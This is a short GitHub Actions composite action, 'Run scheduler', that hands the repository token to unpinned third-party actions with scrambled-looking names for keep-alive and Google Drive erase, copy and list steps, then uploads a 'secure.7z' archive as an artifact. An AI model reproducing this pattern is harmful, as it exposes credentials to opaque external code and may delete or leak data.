description: Run scheduler


inputs:
  token:
    description: github token
    required: false
    default: ${{ github.token }}


runs:
  using: composite

  steps:
    - uses: li1ht2ay-3es/gi1-ac2io3s@keep-alive
      with:
        token: ${{ inputs.token }}
        auto: true


    - uses: li1ht2ay-3es/go1gl2-dr3ve@#-erase-drive
      with:
        token: ${{ inputs.token }}


    - uses: li1ht2ay-3es/go1gl2-dr3ve@#-copy-drive
      with:
        token: ${{ inputs.token }}
        cache: false


    - uses: li1ht2ay-3es/go1gl2-dr3ve@#-list-drive
      with:
        token: ${{ inputs.token }}
        cache: false


    - uses: actions/upload-artifact@main
      with:
        name: secure
        path: |
          ${{ github.workspace }}/secure.7z
